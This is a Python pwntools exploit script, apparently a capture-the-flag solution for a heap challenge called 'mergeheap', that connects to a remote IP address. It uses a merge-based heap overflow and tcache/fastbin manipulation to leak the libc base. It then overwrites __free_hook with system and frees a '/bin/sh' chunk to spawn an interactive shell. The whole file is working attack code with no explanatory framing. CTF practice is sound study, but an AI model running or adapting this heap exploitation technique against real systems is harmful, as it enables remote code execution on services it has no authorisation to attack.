from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)
debug = 0
if debug == 1:
	elf = change_ld('./mergeheap', './ld-2.27.so')
	p = elf.process(env={'LD_PRELOAD':'./libc-2.27.so'})
else:
	p = remote('49.232.100.172', 42690)

def add(size, content):
	p.recvuntil('>>')
	p.sendline('1')
	p.recvuntil('len')
	p.sendline(str(size))
	p.recvuntil('content')
	p.sendline(content)

def show(idx):
	p.recvuntil('>>')
	p.sendline('2')
	p.recvuntil('idx')
	p.sendline(str(idx))

def delete(idx):
	p.recvuntil('>>')
	p.sendline('3')
	p.recvuntil('idx')
	p.sendline(str(idx))

def merge(idx1, idx2):
	p.recvuntil('>>')
	p.sendline('4')
	p.recvuntil('idx1')
	p.sendline(str(idx1))
	p.recvuntil('idx2')
	p.sendline(str(idx2))


add(0x18, 'A' * 0x18)	#0
add(0x10, 'A' * 0xf + '\x71')#1
add(0x28, 'kotori')#2
add(0x50, 'kotori')#3
# add(0x20, 'kotori')#4
# add(0x20, 'kotori')#5
# delete(2)
# merge(0, 1) #2

# delete(3)
# delete(5)
# delete(4)
# #gdb.attach(p)
# add(0x60, 'A' * 0x60)#3
# #gdb.attach(p)
# show(3)
# heap = u64(p.recvline()[-7:-1].ljust(8, '\x00'))
# print hex(heap)
for i in range(8):
	add(0x200, 'kotori')
for i in range(7):
	delete(i + 5)
delete(2)
merge(0, 1) #2
delete(3)
delete(4)
add(0x60, 'A' * 0x60)#3
#gdb.attach(p)
show(3)
libc_base = u64(p.recvline()[-7:-1].ljust(8, '\x00')) - 0x3ebca0
print hex(libc_base)
free_hook = libc_base + 0x3ed8e8
system = libc_base + 0x4f440
delete(3)
add(0x60, 'A' * 0x50 + p64(0) + p64(0x211))#3

#gdb.attach(p)
add(0x28, 'A' * 0x28)#4
add(0x20, 'A' * 0x1f + '\x71')
add(0x48, 'kotori')#6
add(0x30, 'kotori')#7
add(0x60, 'kotori')#8
delete(6)
merge(4, 5)
delete(8)
delete(7)
#gdb.attach(p)
add(0x60, 'A' * 0x30 + p64(0) + p64(0x71) + p64(free_hook))#7
add(0x60, 'kotori')#8
add(0x60, p64(system))#9
add(0x20, '/bin/sh')#10
#gdb.attach(p)
delete(10)
p.interactive()
